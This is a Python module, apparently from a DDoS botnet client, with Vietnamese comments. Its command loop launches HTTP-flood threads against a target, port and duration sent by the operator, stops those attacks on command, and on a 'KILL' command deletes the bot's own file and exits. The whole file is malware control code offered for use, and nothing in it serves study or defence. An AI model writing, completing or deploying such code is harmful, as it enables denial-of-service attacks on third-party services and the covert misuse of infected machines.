import os
import sys
import threading

from .config import CMD_QUEUE, ATTACK_THREADS, STOP_FLAG
from .attack import http_flood


def cleanup_and_exit():
    """Tự hủy bot."""
    STOP_FLAG.set()
    try:
        me = os.path.abspath(sys.argv[0])
        if os.path.exists(me):
            os.remove(me)
    except:
        pass
    os._exit(0)


def stop_all_attacks():
    """Dừng toàn bộ attack."""
    STOP_FLAG.set()
    for t in ATTACK_THREADS:
        if t.is_alive():
            t.join(timeout=2)
    ATTACK_THREADS.clear()
    STOP_FLAG.clear()


def command_processor():
    """Main loop xử lý lệnh."""
    while True:
        cmd = CMD_QUEUE.get()
        ct = cmd.get("type")
        print(f"[EXEC] {ct}")

        # Dọn thread đã chết
        ATTACK_THREADS[:] = [t for t in ATTACK_THREADS if t.is_alive()]

        if ct == "DDOS":
            stop_all_attacks()
            t = threading.Thread(
                target=http_flood,
                args=(cmd["target"], int(cmd["port"]), int(cmd["duration"]), STOP_FLAG),
                daemon=True,
            )
            t.start()
            ATTACK_THREADS.append(t)
        elif ct == "STOP":
            stop_all_attacks()
        elif ct == "KILL":
            cleanup_and_exit()
